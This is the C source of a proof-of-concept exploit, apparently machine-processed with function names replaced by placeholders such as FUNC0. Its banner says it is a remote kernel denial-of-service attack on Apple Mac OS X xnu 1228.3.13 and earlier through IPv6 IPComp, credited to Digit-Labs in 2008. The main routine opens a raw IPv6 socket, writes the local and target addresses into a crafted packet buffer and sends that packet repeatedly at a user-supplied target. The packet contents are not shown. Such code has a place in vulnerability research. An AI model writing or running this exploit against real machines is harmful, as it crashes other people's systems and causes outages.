#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  libnet_t ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET6 ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 unsigned int HAMMER_NUM ; 
 size_t IPV6_DST_OFFSET ; 
 int /*<<< orphan*/  IPV6_INTERFACE ; 
 size_t IPV6_SRC_OFFSET ; 
 int LIBNET_ERRBUF_SIZE ; 
 int /*<<< orphan*/  LIBNET_RAW6_ADV ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,char*,...) ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ,unsigned int*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,char*,int) ; 
 scalar_t__ FUNC4 (int /*<<< orphan*/ ,char*,unsigned int*) ; 
 int /*<<< orphan*/ * FUNC5 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ *,unsigned int*,int) ; 
 int /*<<< orphan*/ * pbuf ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  stderr ; 

int
FUNC9 (int argc, char **argv)
{
  char errbuf[LIBNET_ERRBUF_SIZE], ip6_buf[128];
  unsigned int i, ip6_addr[4];
  libnet_t *lnsock;

  FUNC8 ("Apple MACOS X xnu <= 1228.3.13 ipv6-ipcomp remote kernel DoS PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (argc < 2)
    {
      FUNC1 (stderr, "Usage: %s <dst ipv6>\n", argv[0]);
      FUNC0 (EXIT_FAILURE);
    }

  if (FUNC2 (IPV6_INTERFACE,
                   (unsigned int *) &pbuf[IPV6_SRC_OFFSET]) < 0)
    {
      FUNC1 (stderr, "* get_localip() failed\n");
      FUNC0 (EXIT_FAILURE);
    }

  if (FUNC4 (AF_INET6, argv[1], ip6_addr) <= 0)
    {
      FUNC1 (stderr, "* inet_pton() failed\n");
      FUNC0 (EXIT_FAILURE);
    }
  FUNC7 (&pbuf[IPV6_DST_OFFSET], ip6_addr, sizeof ip6_addr);

  lnsock = FUNC5 (LIBNET_RAW6_ADV, NULL, errbuf);
  if (lnsock == NULL)
    {
      FUNC1 (stderr, "* libnet_init() failed: %s\n", errbuf);
      FUNC0 (EXIT_FAILURE);
    }

  FUNC3 (AF_INET6, &pbuf[IPV6_SRC_OFFSET], ip6_buf, sizeof ip6_buf);
  FUNC8 ("* local ipv6 %s...\n", ip6_buf);
  FUNC8 ("* attacking %s...", argv[1]);
  for (i = 0; i < HAMMER_NUM; i++)
    FUNC6 (lnsock, pbuf, sizeof pbuf - 1);
  FUNC8 ("done\n");

  return (EXIT_SUCCESS);
}